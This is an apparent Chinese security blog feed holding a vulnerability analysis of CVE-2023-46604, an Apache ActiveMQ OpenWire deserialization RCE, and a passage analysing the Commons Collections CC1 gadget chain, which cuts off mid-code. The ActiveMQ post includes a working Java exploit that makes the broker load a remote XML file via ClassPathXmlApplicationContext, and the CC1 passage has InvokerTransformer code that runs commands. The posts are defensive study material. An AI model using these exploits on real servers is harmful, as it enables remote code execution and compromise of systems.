    <content type="html"><![CDATA[<p>CVE-2023-46604 Apache ActiveMQ RCE 漏洞分析</p><span id="more"></span><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="消息队列——MessageQueue"><a href="#消息队列——MessageQueue" class="headerlink" title="消息队列——MessageQueue"></a>消息队列——MessageQueue</h3><p><a href="https://javaguide.cn/high-performance/message-queue/message-queue.html">参考JavaGuide</a></p><p>我们可以把消息队列看作是一个存放消息的容器，当我们需要使用消息的时候，直接从容器中取出消息供自己使用即可。由于队列 Queue 是一种先进先出的数据结构，所以消费消息时也是按照顺序来消费的。</p><p>参与消息传递的双方称为 <strong>生产者</strong> 和 <strong>消费者</strong> ，生产者负责发送消息，消费者负责处理消息。</p><p>操作系统中的进程通信的一种很重要的方式就是消息队列。我们这里提到的消息队列稍微有点区别，更多指的是各个服务以及系统内部各个组件/模块之前的通信，属于一种中间件 。</p><p>通常来说，使用消息队列主要能为我们的系统带来下面三点好处：</p><ol><li>异步处理</li><li>削峰/限流</li><li>降低系统耦合性</li></ol><p>除了这三点之外，消息队列还有其他的一些应用场景，例如实现分布式事务、顺序保证和数据流处理。</p><p><strong>消息队列使用发布-订阅模式工作，消息发送者（生产者）发布消息，一个或多个消息接受者（消费者）订阅消息。</strong> 从上图可以看到<strong>消息发送者（生产者）和消息接受者（消费者）之间没有直接耦合</strong>，消息发送者将消息发送至分布式消息队列即结束对消息的处理，消息接受者从分布式消息队列获取该消息后进行后续处理，并不需要知道该消息从何而来。<strong>对新增业务，只要对该类消息感兴趣，即可订阅该消息，对原有系统和业务没有任何影响，从而实现网站业务的可扩展性设计</strong>。</p><img src="/2024/07/15/CVE-2023-46604%E5%88%86%E6%9E%90/image-20240715104447299.png" class="" title="image-20240715104447299"><h3 id="ActiveMQ"><a href="#ActiveMQ" class="headerlink" title="ActiveMQ"></a>ActiveMQ</h3><p>ActiveMQ是Apache软件基金下的一个开源软件，它遵循JMS1.1规范（Java Message Service），是消息队列服务，是面向消息中间件（MOM）的最终实现，它为企业消息传递提供高可用、出色性能、可扩展、稳定和安全保障。</p><p>在ActiveMQ中，生产者（Producer）发送消息到Queue或者Topic中，消费者（consumer）通过ActiveMQ支持的传输协议连接到ActiveMQ接受消息并做处理。</p><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>Apache ActiveMQ &lt; 5.18.3<br>Apache ActiveMQ &lt; 5.17.6<br>Apache ActiveMQ &lt; 5.16.7<br>Apache ActiveMQ &lt; 5.15.16</p><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>安装ActiveMQ存在漏洞的版本，我这里以<a href="https://activemq.apache.org/components/classic/download/classic-05-17-03">5.17.3</a>为例</p><p>下载解压后，在bin文件夹下，使用<code>./activemq.bat start</code>启动服务，注意需要Java&gt;=11</p><img src="/2024/07/15/CVE-2023-46604%E5%88%86%E6%9E%90/image-20240716100938100.png" class="" title="image-20240716100938100"><p>创建Maven项目，配置依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.activemq<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>activemq-client<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>5.17.3<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>在依赖里找到activemq-client里面的BaseDataStreamMarshaller，下载源码，此时这个包里的所有文件都是Java源码便于我们分析</p><img src="/2024/07/15/CVE-2023-46604%E5%88%86%E6%9E%90/image-20240715105311076.png" class="" title="image-20240715105311076"><h2 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h2><p>首先，我先给出漏洞存在的代码，在<code>org/apache/activemq/openwire/v9/BaseDataStreamMarshaller.java</code>中，它存在一个<code>createThrowable</code>的函数，如下：</p><img src="/2024/07/15/CVE-2023-46604%E5%88%86%E6%9E%90/image-20240717232911658.png" class="" title="image-20240717232911658"><p>可以看到，这里使用了反射，根据我们传入的类名生成了它的一个构造器对象，最后返回了这个类的一个实例。很显然，这里可以调用任意类造成RCE。</p><p>我们查看对<code>createThrowable</code>的调用，只有两处并且都在同一个类下，<code>tightUnmarsalThrowable</code>和<code>looseUnmarsalThrowable</code>，分别跳转过去看一眼。</p><img src="/2024/07/15/CVE-2023-46604%E5%88%86%E6%9E%90/image-20240716092233714.png" class="" title="image-20240716092233714"><p>我们可以看到，在<code>looseUnmarsalThrowable</code>中，调用了<code>looseUnmarsalString</code>对我们的传入进行处理，可以看到这里面只是把我们的输入转成Unicode字符集就直接返回了。而在另一个<code>tightUnmarsalThrowable</code>函数中，做了很多别的处理，可以自己去看看。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// looseUnmarsalThrowable部分代码</span><br><span class="hljs-type">String</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> looseUnmarshalString(dataIn);<br><span class="hljs-type">String</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> looseUnmarshalString(dataIn);<br><span class="hljs-type">Throwable</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> createThrowable(clazz, message);<br><span class="hljs-comment">// 调用looseUnmarshalString</span><br><span class="hljs-keyword">protected</span> String <span class="hljs-title function_">looseUnmarshalString</span><span class="hljs-params">(DataInput dataIn)</span> <span class="hljs-keyword">throws</span> IOException {<br>    <span class="hljs-keyword">if</span> (dataIn.readBoolean()) {<br>        <span class="hljs-keyword">return</span> dataIn.readUTF();<br>    } <span class="hljs-keyword">else</span> {<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    }<br>}<br></code></pre></td></tr></table></figure><p>接着，查看对<code>looseUnmarsalThrowable</code>的调用，有好几个，那么我们重点关注了<code>ExceptionResponseMarshaller</code>这个类（当然其他的也可以），它是<code>BaseDataStreamMarshaller</code>的一个子类，按照名字来说就是对ExceptionResponse进行序列化处理的。</p><img src="/2024/07/15/CVE-2023-46604%E5%88%86%E6%9E%90/image-20240716093644841.png" class="" title="image-20240716093644841"><p>跳转到这个调用处，可以看到在这里面将o强转为<code>ExceptionResponse</code>类，然后进行反序列化</p><img src="/2024/07/15/CVE-2023-46604%E5%88%86%E6%9E%90/image-20240717233157738.png" class="" title="image-20240717233157738"><p>反向分析就到这里，因为对于<code>looseUnmarshal</code>的调用太多了，我们现在还不确定在ActiveMQ中反序列化的具体流程，但是没有太大关系，目前很清晰的知道，只需要构造一个<code>ExceptionResponse</code>类的序列化数据，传递给ActiveMQ中进行反序列化，最终可以触发到<code>createThrowable</code>函数导致RCE</p><p>到目前我们的链子为：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs py">ExceptionResponseMarshaller<span class="hljs-comment">#looseUnmarshal</span><br>BaseDataStreamMarshaller<span class="hljs-comment">#looseUnmarsalThrowable</span><br>BaseDataStreamMarshaller<span class="hljs-comment">#createThrowable</span><br></code></pre></td></tr></table></figure><p>下面远程调试ActiveMQ，我们先编写一个测试类，用于发送OpenWire格式的数据。</p><p>这个相当于是生产者Client在向ActiveMQ服务端发送消息</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception {<br>    <span class="hljs-type">ConnectionFactory</span> <span class="hljs-variable">connectionFactory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <br>        <span class="hljs-title class_">ActiveMQConnectionFactory</span>(<span class="hljs-string">"tcp://127.0.0.1:61616"</span>);<br>    <span class="hljs-type">Connection</span> <span class="hljs-variable">connection</span> <span class="hljs-operator">=</span> connectionFactory.createConnection();<br>    connection.start();<br><br>    <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> connection.createSession(<span class="hljs-literal">false</span>, Session.AUTO_ACKNOWLEDGE);<br>    <span class="hljs-type">Destination</span> <span class="hljs-variable">destination</span> <span class="hljs-operator">=</span> session.createQueue(<span class="hljs-string">"3xsh0re"</span>);<br><br>    <span class="hljs-type">MessageProducer</span> <span class="hljs-variable">producer</span> <span class="hljs-operator">=</span> session.createProducer(destination);<br>    <span class="hljs-type">TextMessage</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> session.createTextMessage(<span class="hljs-string">"Hello, ActiveMQ!"</span>);<br>    producer.send(message);<br><br>    session.close();<br>    connection.close();<br>}<br></code></pre></td></tr></table></figure><p><strong>注意接下来的调试是远程调试ActiveMQ</strong>，通过OpenWire通信的包会在<code>org.apache.activemq.openwire</code>的<code>doUnmarshal</code>函数中进行反序列化，这里需要DataType为31才会触发我们需要的反序列化函数</p><img src="/2024/07/15/CVE-2023-46604%E5%88%86%E6%9E%90/image-20240717143136056.png" class=""><p>进一步处理，</p><img src="/2024/07/15/CVE-2023-46604%E5%88%86%E6%9E%90/image-20240717143342022.png" class="" title="image-20240717143342022"><p>下面的问题转移到了如何构造一个<code>ExceptionResponse</code>的数据，接下来<strong>回到客户端的调试</strong></p><p>在数据进入到序列化函数之前，会进入到一个叫<code>oneway</code>的函数，这里学习到了一个patch手法，在当前源文件的目录下新建一个和依赖类相同路径的文件，根据classpath的默认调用顺序，会优先进入这个新的同名类中</p><img src="/2024/07/15/CVE-2023-46604%E5%88%86%E6%9E%90/image-20240717144825617.png" class="" title="image-20240717144825617"><p>怎么做？</p><p>在当前源码目录下新建一个 <code>org.apache.activemq.transport.tcp.TcpTransport</code> 类, 然后重写对应的逻辑, 这样在运行的时候, 因为 classpath 查找顺序的问题, 程序就会优先使用当前源码目录里的 TcpTransport 类。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//这里只写了重构的函数，需要将类中必要的其他内容copy</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">oneway</span><span class="hljs-params">(Object command)</span> <span class="hljs-keyword">throws</span> IOException {<br>    <span class="hljs-built_in">this</span>.checkStarted();<br>    <span class="hljs-type">Throwable</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassPathXmlApplicationContext</span>(<span class="hljs-string">"http://127.0.0.1:8000/poc.xml"</span>);<br>    <span class="hljs-type">ExceptionResponse</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ExceptionResponse</span>(obj);<br>    <span class="hljs-built_in">this</span>.wireFormat.marshal(response, <span class="hljs-built_in">this</span>.dataOut);<br>    <span class="hljs-built_in">this</span>.dataOut.flush();<br>}<br></code></pre></td></tr></table></figure><p>然后是 createThrowable 方法的利用,  因为 ActiveMQ 自带 spring 相关依赖, 那么就可以利用 ClassPathXmlApplicationContext 加载 XML实现 RCE</p><p>在 marshal 的时候会调用 <code>o.getClass().getName()</code> 获取类名, 而 getClass 方法无法重写 (final), 所以我在这里同样 patch 了 <code>org.springframework.context.support.ClassPathXmlApplicationContext</code>, 使其继承 Throwable 类</p><p>最后成功触发</p><img src="/2024/07/15/CVE-2023-46604%E5%88%86%E6%9E%90/image-20240717145629917.png" class="" title="image-20240717145629917"><h2 id="编写Exp"><a href="#编写Exp" class="headerlink" title="编写Exp"></a>编写Exp</h2><p>上面的分析都是基于ActiveMQ提供的client来进行发送恶意数据进行RCE，但是其实可以直接构造OpenWire协议的流量发送给ActiveMQ进行解析，从而不用进行patch操作。</p><p><a href="https://activemq.apache.org/components/classic/documentation/openwire-version-2-specification">官方关于OpenWire协议的定义</a></p><img src="/2024/07/15/CVE-2023-46604%E5%88%86%E6%9E%90/image-20240717152851161.png" class="" title="image-20240717152851161"><p>也就是大概三部分：size、type、data，同时也可以在官方解释的下文发现，type=31正好就是我们需要的<code>ExceptionResponse</code></p><p>然后数据部分也就是官方说的<code>command-specific-fields</code>部分的要求，对于string类型的数据采用UTF-8进行编码</p><img src="/2024/07/15/CVE-2023-46604%E5%88%86%E6%9E%90/image-20240717153254538.png" class="" title="image-20240717153254538"><p>通过wireshark抓包分析数据包具体格式，还需要一些其他字段</p><img src="/2024/07/15/CVE-2023-46604%E5%88%86%E6%9E%90/image-20240717154424495.png" class=""><p>最后构造Exp:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException {<br>    <span class="hljs-type">Socket</span> <span class="hljs-variable">socket</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Socket</span>(<span class="hljs-string">"127.0.0.1"</span>, <span class="hljs-number">61616</span>);<br>    <span class="hljs-type">OutputStream</span> <span class="hljs-variable">os</span> <span class="hljs-operator">=</span> socket.getOutputStream();<br>    <span class="hljs-type">DataOutputStream</span> <span class="hljs-variable">dos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataOutputStream</span>(os);<br>    dos.writeInt(<span class="hljs-number">0</span>);  <span class="hljs-comment">// size</span><br>    dos.writeByte(<span class="hljs-number">31</span>);<span class="hljs-comment">// type</span><br>    dos.writeInt(<span class="hljs-number">0</span>);  <span class="hljs-comment">// CommandId</span><br>    dos.writeBoolean(<span class="hljs-literal">false</span>);<span class="hljs-comment">// Command response required</span><br>    dos.writeInt(<span class="hljs-number">0</span>);  <span class="hljs-comment">// CorrelationId</span><br><br>    <span class="hljs-comment">// body</span><br>    dos.writeBoolean(<span class="hljs-literal">true</span>);<br>    <span class="hljs-comment">// UTF</span><br>    dos.writeBoolean(<span class="hljs-literal">true</span>);<br>    dos.writeUTF(<span class="hljs-string">"org.springframework.context.support.ClassPathXmlApplicationContext"</span>);<br>    dos.writeBoolean(<span class="hljs-literal">true</span>);<br>    dos.writeUTF(<span class="hljs-string">"http://127.0.0.1:8000/poc.xml"</span>);<br><br>    dos.close();<br>    os.close();<br>    socket.close();<br>}<br></code></pre></td></tr></table></figure><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p> <code>BaseDataStreamMarshaller</code>类加入了<code>validateIsThrowable</code>方法，判断我们传入的类是否合法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">validateIsThrowable</span><span class="hljs-params">(Class&lt;?&gt; clazz)</span> {<br>    <span class="hljs-keyword">if</span> (!Throwable.class.isAssignableFrom(clazz)) {<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">"Class "</span> + <br>                                           clazz + <br>                                           <span class="hljs-string">" is not assignable to Throwable"</span>);<br>    }<br>}<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>漏洞分析</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞分析</tag>
      
      <tag>Java安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CC1链分析</title>
    <link href="/2024/07/08/CC1%E9%93%BE%E5%88%86%E6%9E%90/"/>
    <url>/2024/07/08/CC1%E9%93%BE%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<p>Java安全的里程碑，CC链！</p><span id="more"></span><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>​Apache Commons Collections是一个扩展了Java标准库里的Collection结构的第三方基础库，它提供了很多强大的数据结构类型和实现了各种集合工具类。作为Apache开放项目的重要组件，Commons Collections被广泛的各种Java应用的开发，⽽正是因为在⼤量web应⽤程序中这些类的实现以及⽅法的调⽤，导致了反序列化⽤漏洞的普遍性和严重性。</p><p>​commons-collections组件反序列化漏洞的反射链也称为CC链，自从apache commons-collections组件爆出第一个java反序列化漏洞后，就像打开了java安全的新世界大门一样，之后很多java中间件相继都爆出反序列化漏洞。本文分析java反序列化CC1链，前置知识是java安全基础中的反射。</p><h3 id="Java机制：反射"><a href="#Java机制：反射" class="headerlink" title="Java机制：反射"></a>Java机制：反射</h3><p>​<a href="https://pdai.tech/md/java/basic/java-basic-x-reflection.html">参考文章</a></p><p>​JAVA反射机制是在运行状态中，对于任意一个类，都能够知道这个类的所有属性和方法；对于任意一个对象，都能够调用它的任意一个方法和属性；这种动态获取的信息以及动态调用对象的方法的功能称为java语言的反射机制。</p><p>​在Java中，Class类与java.lang.reflect类库一起对反射技术进行了全力的支持。在反射包中，我们常用的类主要有Constructor类表示的是Class 对象所表示的类的构造方法，利用它可以在运行时动态创建对象、Field表示Class对象所表示的类的成员变量，通过它可以在运行时动态修改成员变量的属性值(包含private)、Method表示Class对象所表示的类的成员方法，通过它可以动态调用对象的方法(包含private)。</p><p>​总之简单来说，就是我们可以在Java程序运行时去操作类。调度反射方法，最终是由jvm执行invoke()执行。</p><p><a href="https://blog.csdn.net/Jayjay___/article/details/133621214">参考文章</a></p><h2 id="分析准备"><a href="#分析准备" class="headerlink" title="分析准备"></a>分析准备</h2><p>环境配置：</p><ul><li>CommonsCollections &lt;= 3.2.1</li><li>java &lt; 8u71</li></ul><p>Maven依赖：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>           <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>           <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>           <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>利用链：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">AnnotationInvocationHandler.readObject()--&gt;<br>AbstractInputCheckedMapDecorator.MapEntry.setValue()--&gt;<br>TransformedMap.checkSetValue()--&gt;<br>ChainedTransformer.transform()--&gt;<br>InvokerTransformer.transform()<br></code></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p><strong>分析应当是自底向上的，从脆弱点开始，经过一步一步封装成为一条完整的利用链。</strong></p><p><strong>分析的时候建议在Maven中把依赖的源码下载下来。</strong></p><h3 id="脆弱点分析"><a href="#脆弱点分析" class="headerlink" title="脆弱点分析"></a>脆弱点分析</h3><p>脆弱点：<code>org.apache.commons.collections.Transformer</code>，transform方法有21种实现</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.apache.commons.collections;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Transformer</span> {<br>    Object <span class="hljs-title function_">transform</span><span class="hljs-params">(Object var1)</span>;<br>}<br></code></pre></td></tr></table></figure><p>脆弱类：Invoketransformer，我们重点看它的transform方法，发现可以执行传入的对象中的方法，显然这里可以执行任意代码。</p><img src="/2024/07/08/CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20240708162534863.png" class="" title="image-20240708162534863"><p>下面是Invoketansformer的一个构造函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">InvokerTransformer</span><span class="hljs-params">(String methodName, Class[] paramTypes, Object[] args)</span> {<br>    <span class="hljs-built_in">super</span>();<br>    iMethodName = methodName;<br>    iParamTypes = paramTypes;<br>    iArgs = args;<br>}<br></code></pre></td></tr></table></figure><p>首先先尝试直接利用Invoketransformer来执行命令，我们只需要按照上面的构造函数去生成一个对象，然后调用它的transform方法。要执行系统命令，methodName为<code>exec</code>，参数类型为String，参数为<code>calc</code>。在transform中我们只需要传入Runtime类的实例，使用Runtime.getRuntime()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC1</span> {<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">"exec"</span>, <br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]{String.class}, <br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]{<span class="hljs-string">"calc"</span>}).transform(Runtime.getRuntime());<br>    }<br>}<br></code></pre></td></tr></table></figure><p>直接运行，执行弹出计算器命令：</p><img src="/2024/07/08/CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20240710090205947.png" class="" title="image-20240710090205947"><h3 id="构造序列化链"><a href="#构造序列化链" class="headerlink" title="构造序列化链"></a>构造序列化链</h3><p>当然在实际的漏洞中，不可能直接就这么触发，一定是经过了多层调用，当恶意payload执行到这里才会造成RCE。我们就这么盲目地去找吗，当然不是，我们这里是反序列化漏洞，所以最顶层的调用一定是某个readObject()方法。</p><p>特地提到这个方法是因为在反序列化漏洞中它起到了关键作用，readObject()方法被重写的的话，反序列化该类时调用便是重写后的readObject()方法，如果该方法书写不当的话就有可能引发恶意代码的执行。</p><p>那么接下来我们继续分析，按住ctrl单击transform函数查看调用它的函数，我们跳转到<code>TransformedMap</code>类的<code>transform</code>函数中</p><img src="/2024/07/08/CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20240710104121758.png" class="" title="image-20240710104121758"><p>可以发现是一个叫<code>checkSetValue</code>的函数，就一行很简单直接调用了transform，我们接着查看对它的调用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> Object <span class="hljs-title function_">checkSetValue</span><span class="hljs-params">(Object value)</span> {<br>    <span class="hljs-keyword">return</span> valueTransformer.transform(value);<br>}<br></code></pre></td></tr></table></figure><p>发现对它的调用只有一处，直接跳转了，在AbstractInputCheckedMapDecorator中的setValue函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object value)</span> {<br>    value = parent.checkSetValue(value);<br>    <span class="hljs-keyword">return</span> entry.setValue(value);<br>}<br></code></pre></td></tr></table></figure><p>通过上面的分析，我们可以进一步的构造我们的代码：</p><p>要调用setValue这个函数很简单，因为它是一个共有函数，那么下一步是解决如何构造TransformedMap的一个实例，然后去作为setValue函数的参数，发现它的构造函数是一个受保护的，所以去找哪里可以调用函数构造它。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-title function_">TransformedMap</span><span class="hljs-params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> {<br>    <span class="hljs-built_in">super</span>(map);<br>    <span class="hljs-built_in">this</span>.keyTransformer = keyTransformer;<br>    <span class="hljs-built_in">this</span>.valueTransformer = valueTransformer;<br>}<br></code></pre></td></tr></table></figure><p>查看对构造函数的调用，发现它有一个叫decorate的函数可以构造：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Map <span class="hljs-title function_">decorate</span><span class="hljs-params">(Map map, Transformer keyTransformer, </span><br><span class="hljs-params">                           Transformer valueTransformer)</span> {<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);<br>}<br></code></pre></td></tr></table></figure><p>那么到这里我们就可以写出当前的利用链了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {<br>    <span class="hljs-comment">// 获取一个runtime实例</span><br>    <span class="hljs-type">Runtime</span> <span class="hljs-variable">shell</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>    <span class="hljs-comment">// 第一层</span><br>    <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <br>        <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">"exec"</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]{String.class},<span class="hljs-keyword">new</span> <span class="hljs-title 